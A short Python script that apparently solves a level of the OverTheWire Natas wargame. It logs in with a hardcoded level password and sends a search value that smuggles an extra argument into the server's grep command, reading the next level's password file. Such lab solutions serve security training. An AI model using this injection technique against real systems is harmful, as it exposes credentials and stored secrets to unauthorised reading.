#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = "http://%s.natas.labs.overthewire.org" % username


data = {"needle":".* /etc/natas_webpass/natas11 #","submit":"Search"}
req_post = req.post(url,auth=(username,password),data=data)

print(req_post.text)


# nxt_pass = re.findall("/etc/natas_webpass/natas11:(.*)",req_post.text)
# print(nxt_pass[0])
